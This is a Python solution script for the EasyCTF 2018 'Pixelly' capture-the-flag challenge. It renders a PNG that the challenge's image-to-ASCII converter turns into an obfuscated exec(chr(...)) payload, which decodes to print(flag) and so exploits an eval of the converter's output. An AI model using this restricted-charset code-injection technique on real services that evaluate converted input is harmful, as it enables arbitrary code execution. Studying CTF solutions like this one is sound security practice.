#! /usr/bin/env python3
##
# Created for EasyCTF 2018_Pixelly
# By Amos (LFlare) Ng <amosng1@gmail.com>
##
from PIL import Image
import numpy as np
import gmpy2

# Settings
# chars = np.asarray(list(' -"~rc()+=01exh%'))
chars = ' -"~rc()+=01exh%'
SC, GCF, WCF = 1/10, 1, 7/4

# Flag: 102 108 97 103
# Eval: 101 118 97 108
payload = 'exec(chr(110+1+1)+chr(110+1+1+1+1)+chr(100+1+1+1+1+1)+chr(110)+chr(110+1+1+1+1+1+1)+chr(10+10+10+10)+chr(100+1+1)+chr(100+1+1+1+1+1+1+1+1)+chr(10+10+10+10+10+10+10+10+10+1+1+1+1+1+1+1)+chr(100+1+1+1)+chr(10+10+10+10+1+1%1))'
flag = payload

# Create new flag, [7,5]
img = Image.new("RGB", (1280, 10), (255, 255, 255))
pixels = img.load()

# Convert flag back to integers
flag = np.asarray([chars.index(c) for c in flag])

# Attempt to convert to colors
flag = (1.0 - flag/flag.max()) * 765

x = []
for i in range(1280):
    gen = Image.new("RGB", (1280, 10), (255, 255, 255))
    genpix = gen.load()
    genpix[i, 5] = (0,0,0)

    try:
        temp = np.asarray(list(' -"~rc()+=01exh%'))
        SC, GCF, WCF = 1/10, 1, 7/4

        S = ( round(gen.size[0]*SC*WCF), round(gen.size[1]*SC) )
        gen = np.sum( np.asarray( gen.resize(S) ), axis=2)
        gen -= gen.min()
        gen = (1.0 - gen/gen.max())**GCF*(temp.size-1)

        arr = temp[gen.astype(int)]
        arr = '\n'.join(''.join(row) for row in arr)
        x.append(i)
    except:
        pass

# Generate flag
for x, color in zip(x, flag):
    colors = int(color/3)
    pixels[x, 5] = (colors, colors, colors)

# Save
img.save("flagger.png")
